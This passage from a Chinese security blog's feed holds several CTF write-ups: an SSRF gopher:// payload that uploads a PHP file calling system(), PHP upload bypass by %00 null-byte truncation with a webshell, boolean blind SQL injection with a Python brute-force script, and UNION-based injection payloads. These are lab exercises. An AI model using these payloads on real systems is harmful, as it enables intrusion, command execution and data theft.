class="line">urlStr = urllib.parse.quote(payload)</span><br><span class="line"><span class="comment"># 注意要用 %0D%0A 代替回车换行</span></span><br><span class="line">urlStr = urlStr.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line"><span class="comment"># 再次编码</span></span><br><span class="line">urlStr = urllib.parse.quote(urlStr)</span><br><span class="line">print(urlStr)</span><br></pre></td></tr></table></figure>

<p>伪造如下请求数据：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520340%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522find.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250A%250D%250Asystem%2528%2527find%2520/%2520-name%2520%252Aflag%252A%2527%2529%253B%250D%250A%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ--%250D%250A%250D%250A</span></span><br></pre></td></tr></table></figure>

<p>构造Payload（<strong>注意</strong>：gopher协议会将第一个字符吞掉，记得多补一个字符）：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520340%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522find.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250A%250D%250Asystem%2528%2527find%2520/%2520-name%2520%252Aflag%252A%2527%2529%253B%250D%250A%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ--%250D%250A%250D%250A</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220629154916452.png" alt="image-20220629154916452"></p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>php文件上传00截断</title>
    <url>/2022/06/25/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A000%E6%88%AA%E6%96%AD/</url>
    <content><![CDATA[<p><code>0x00</code>，<code>%00</code>，<code>/00</code>之类的截断，本质都是一样的，只是不同的表示形式而已。就比如女朋友、女票。</p>
<p>在网站<code>url</code>中，<code>%00</code>会被解码成0，而在<code>ascii</code>中，0是一个特殊字符（并不是字符<code>&#39;0&#39;</code>），表示字符串结束，因此如果<code>url</code>中出现了<code>%00</code>，则意味着解码完毕。</p>
<a id="more"></a>

<p>如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://www.yalexin/?file=test.txt</span><br></pre></td></tr></table></figure>

<p>此时输出的是<code>test.txt</code></p>
<p>如果换成：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://www.yalexin/?file=test.php%00.txt</span><br></pre></td></tr></table></figure>

<p>则此时输出的是<code>test.php</code></p>
<p>让我们来看一道例题：</p>
<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub 技能树-web-文件上传-00截断</a></p>
<p>打开场景后是一个上传文件的页面，查看源代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'上传成功'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST['submit'])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES['file']['name']);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info['extension'];</span></span><br><span class="line"><span class="comment">    $whitelist = array("jpg", "png", "gif");</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo "&lt;script&gt;alert('上传成功')&lt;/script&gt;";</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo "&lt;script&gt;alert('上传失败')&lt;/script&gt;";</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo "文件类型不匹配";</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到源代码中，先是看一下文件的类型是不是在白名单内（即只能上传图片类型），文件类型通过以后，解析<code>road</code>参数值，然后拼接到一个随机数字以及日期作为文件名并上传到指定目录。</p>
<p>经过简单地分析以后，大概知道了思路：使用代理，写一个<code>php</code>脚本，将其扩展名改为图片类型，然后截取数据包、修改数据包，访问我们上传的脚本。</p>
<p>首先查找<code>flag</code>可能的位置：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">'find / | grep flag'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将其文件保存为<code>hack.png</code></p>
<p>然后开启代理，打开<code>Burp Suite</code>软件，并将拦截器（<code>intercept</code>）打开</p>
<p> 在浏览器中上传我们刚刚的<code>hack.png</code></p>
<p>然后我们会在<code>Burp</code>中看到该数据报，我们尝试将</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?road=/var/www/html/upload/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>改为：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?road=/var/www/html/upload/hack.php%00</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>然后点击<code>forward</code></p>
<p>上传成功以后，我们访问该脚本：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/upload/hack.php</span><br></pre></td></tr></table></figure>

<p>果然看到了一些内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags /sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/dummy0/flags /sys/module/scsi_mod/parameters/default_dev_flags /proc/kpageflags /usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al /usr/lib/perl/5.14.2/bits/waitflags.ph /var/www/html/flag_139938352.php</span><br></pre></td></tr></table></figure>

<p>最后的就是我们想要的内容。要读取该文件。</p>
<p>修改我们的脚本<code>hack.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">'cat ../flag_139938352.php'</span>)<span class="comment">//注意，该脚本最终会上传到/var/www/html/upload 文件夹下，因此要回到上一级目录读取 flag</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>按照刚刚的方法继续上传即可读取该内容（<strong>注意</strong>：我们访问hack.php的时候会遇到空白页面，右键查看源码即可看到<code>flag</code>）。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入骚操作之布尔盲注</title>
    <url>/2022/06/15/SQL%E6%B3%A8%E5%85%A5%E9%AA%9A%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>这段时间学习<code>SQL</code>注入的时候，发现了一个贼有意思的知识点——布尔盲注。该注入方式一般用于页面回显信息只有两种情况的时候，恰好对应布尔值中的<code>ture</code>和<code>false</code>。<a id="more"></a></p>
<hr>
<p>本文参考自文章<a href="https://blog.csdn.net/qq_35569814/article/details/100175886" target="_blank" rel="noopener">SQL注入之布尔盲注</a></p>
<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>布尔盲注主要用三个函数</p>
<h3 id="length-str"><a href="#length-str" class="headerlink" title="length(str)"></a>length(str)</h3><p>返回字符串<code>str</code>的长度，以字节为单位。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="string">'hello'</span>); <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<h3 id="substr-string-start-length"><a href="#substr-string-start-length" class="headerlink" title="substr(string, start, length)"></a>substr(string, start, length)</h3><p>string为字符串；start为起始位置；length为长度。</p>
<blockquote>
<p>注意：mysql中的start是从1开始的。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">'hello'</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment"># h</span></span><br></pre></td></tr></table></figure>

<h3 id="ascii-character"><a href="#ascii-character" class="headerlink" title="ascii(character)"></a>ascii(character)</h3><p>返回字符<code>character</code>的<code>ASCII</code>值，如果传入的是一个字符串，则返回其第一个字符的<code>ASCII</code>值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">'a'</span>); <span class="comment"># 97</span></span><br></pre></td></tr></table></figure>

<h2 id="注入实现"><a href="#注入实现" class="headerlink" title="注入实现"></a>注入实现</h2><p>题目来源：<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub布尔盲注</a></p>
<p>打开场景后，输入1或者2，页面都显示<code>query_success</code>，输入<code>3</code>则显示<code>query_error</code>，初步判读是可以进行盲注（别判断了，题目就说了是布尔盲注🙃）。</p>
<p>按照正常流程，我们接下来就是<strong>猜数据库名字</strong>了，先查一下数据库名字长度：</p>
<p>输入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">database</span>()))=<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>发现不行，继续尝试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">database</span>()))=<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>果然猜对了，长度是4！👍</p>
<p>下一步，就是精确数据库名字了，用<code>substr</code>函数可以一步一步将数据库名字试探出来，二分法思想先试一下第一个字母的范围：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'a'</span>;</span><br></pre></td></tr></table></figure>

<p>得知，第一个字母比<code>a</code>大，继续：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'m'</span>;</span><br></pre></td></tr></table></figure>

<p>得知，第一个字母比<code>m</code>大，继续：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'s'</span>;</span><br></pre></td></tr></table></figure>

<p>得知，第一个不大于<code>s</code>，结合之前的，第一个字母是大于<code>m</code>，小于等于<code>s</code>，不断缩小范围，最后猜出第一个字母是<code>s</code>。</p>
<p>如法炮制，最后，得知数据库名字为<code>sqli</code></p>
<p><strong>猜表名</strong></p>
<p>在此之前，我们先来认识一下<code>group_concat</code>函数，该函数可以将结果进行拼接，以逗号间隔。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>经过漫长地测试，我发现……我逐渐失去了耐心却还没有试出长度😭，不管了，先测试第一个字符吧，我发现页面回显的<code>SQL</code>语句中有一个表名是<code>news</code>，先试一下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">4</span>)=<span class="string">'news'</span></span><br></pre></td></tr></table></figure>

<p>竟然不是！会不会是<code>SQL</code>语句本身就有误？</p>
<p>先看看是不是包含<code>news</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and locate('news',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>发现语句没问题，那就先看看有没有<code>flag</code>这个表吧：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and locate('flag',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>果然有！</p>
<p><strong>猜字段</strong></p>
<p>先猜一下字段总长度：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()))&gt;<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>小于五，最后试出来是4，盲猜<code>flag</code>😊</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()) =<span class="string">'flag'</span></span><br></pre></td></tr></table></figure>

<p>果不其然，只有一个字段，字段名为<code>flag</code></p>
<p><strong>猜内容</strong></p>
<p>先看一下行数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> flag) =<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>确定只有一行！</p>
<blockquote>
<p>如果有多行数据，可以使用limit关键字</p>
</blockquote>
<p>看看总长度：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> * <span class="keyword">from</span> flag)) &gt; <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>经过漫长地测试，我终于试出来了总长度是32，丧心病狂！！！！😭让我一个一个去测试，那我会崩溃掉的，程序员怎么能做重复无聊的工作呢！</p>
<p>看看前面几个字符是不是<code>ctfhub{</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> * <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">7</span>) =<span class="string">'ctfhub&#123;'</span></span><br></pre></td></tr></table></figure>

<p>好了，下面就是用脚本解决问题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url=<span class="string">r"http://challenge-93e4d1abfb79ed96.sandbox.ctfhub.com:10800/"</span></span><br><span class="line">    code = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">        print(<span class="string">'start idx = '</span>, idx)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">129</span>):</span><br><span class="line">            Params = &#123;<span class="string">"id"</span>:<span class="string">"1 and substr((select * from flag),"</span> + str(idx) + <span class="string">",1) = '"</span>+ chr(c) +<span class="string">"'"</span>&#125;</span><br><span class="line">            response = requests.get(url = url, params = Params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'query_success'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                code += chr(c)</span><br><span class="line">                print(idx, <span class="string">' ok '</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 由于 mysql 判断的时候不区分大小写，因此code全是大写字母，但是最终答案是小写的</span></span><br><span class="line">    print(code.lower())</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>终于把这道题给写出来了，做得有点痛苦，看来以后得多学学<code>sqlmap</code>这个利器了！</p>
<p>经过这一轮学习，发现网络安全真是防不胜防，方寸之间的漏洞都可能被不发分子利用，也说明了网络安全道路任重道远。</p>
<p>最后，写完这道题我想起了之前遇到的一个电脑高手。</p>
<p>很久以前，那还是我用<code>win98</code>的时候，有次我系统崩溃了，因为我是电脑白痴，我朋友给我介绍了一个高手来帮我修电脑。他看了一下电脑，问我有没有98的盘，我说没有。他想了一下，叫我把固定电话拿给他，我想修电脑要电话干什么，但人家是高手，我也不好说什么，就把电话拔下来给他了。他把电话线空着的一头接在电脑的一个插孔内，然后进入了<code>dos</code>，然后就开始在电话上不停的按着键，他按键的速度非常快，但是只按0，1两个键，我搞不懂这有什么用，但也不敢问，看了半个多小时，他还是不停的按这两个键，我渐渐的有些困，我问他这东西要搞多久，他说要几个小时，我给他倒了杯茶，就一个人去隔壁睡觉了。醒来的时候，一看已经过了4个多小时，我起身到隔壁，看见他正在98里面调试，过了一会儿，他说，你试试，我坐上椅子用了一下，真的好了，我当时也不懂电脑，谢过人家就走了。后来我慢慢对电脑有了了解，终于了解，原来当时那位高手是用机器语言编了一个98系统，我后来问我朋友那位高手的下落，我朋友说前几年去了美国IBM之后，杳无音讯……我很想他，如果谁遇到了，请给我发个短信……</p>
<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊查询之SQL注入（攻防世界NewsCenter题解）</title>
    <url>/2022/05/22/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CNewsCenter%E9%A2%98%E8%A7%A3%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>SQL</code>注入是由于开发人员编写程序不当，攻击者可以在开发人员编写好的<code>SQL</code>语句的基础上，构造额外的<code>SQL</code>语句，从而发生意外的错误。</p>
<a id="more"></a>

<p>例如，如果我们有一个根据<code>id</code>查询的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = test_id</span><br></pre></td></tr></table></figure>

<p>使用高级语言编写语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql = <span class="string">"select * from test_table where id = "</span> + test_id;</span><br></pre></td></tr></table></figure>

<p>如果攻击者尝试将<code>test_id</code>构造成</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">2;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>

<p>那么最终执行的<code>SQL</code>语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>

<p>当然你可能会说攻击者不知道表名，因此上面的很难构造出来。但是我想说的是如果存在<code>SQL</code>注入风险的时候，<strong>攻击者获取表名的方式你难以想象得到</strong>。</p>
<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>攻防世界<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1" target="_blank" rel="noopener"><code>NewsCenter</code></a></p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开场景后，发现是一个新闻页面，输入框中输入内容，然后进行模糊查询。</p>
<p>而模糊查询的一般语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%str%'</span></span><br></pre></td></tr></table></figure>

<p>尝试输入<code>%&#39;</code>，发现后台报错，因此判定后台可以进行<code>SQL</code>注入。</p>
<p>然后略加思考，<code>flag</code>应该就藏在当前的数据库中？因此先数据库名；先输入<code>%&#39;;SELECT DATABASE(); --</code>（中划线是将后面的<code>SQL</code>语句处理成注释形式），发现并没有返回预期的结果，然后想了想，查询到的数据应该是有好几列，然后一行是一个新闻，将其渲染，再返回到浏览器，接着分析了一下，每个新闻都有标题和内容，查询应该至少有两列，再次尝试构造<code>SQL</code>语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><code>UNION</code>的意思是说将两个查询结果合并，可以执行的前提是两个查询有相同的列数，具体用法可以去网上查查。</p>
<p>发现还是报错，再次增加一列进行尝试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(), <span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>果然在最后的新闻列表中出现了数据库名<code>news</code>。</p>
<p>然后看看该数据库中都有哪些表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaaaaa%' UNION <span class="keyword">SELECT</span> table_name,table_name,table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'news'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>aaaaaaaa</code>可以随便设置，最好是新闻中没有出现过的字符，这样子就方便获取我们想要的内容了。</p>
</blockquote>
<p>然后发现有两张表，一个是<code>news</code>，另一个是<code>secret_table</code>！</p>
<p>然后看看第二张表的字段名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> COLUMN_NAME,COLUMN_NAME,COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'secret_table'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>出现了一个<code>fl4g</code>字段名，再继续查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> fl4g, fl4g, fl4g <span class="keyword">FROM</span> secret_table; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>返回了<code>QCTF{sq1_inJec7ion_ezzz}</code>。至此，本题答案<strong>水落石出</strong></p>
<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web_php_include题解</title>
    <url>/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>题目地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1" target="_blank" rel="noopener"><code>Web_php_include</code></a></p>
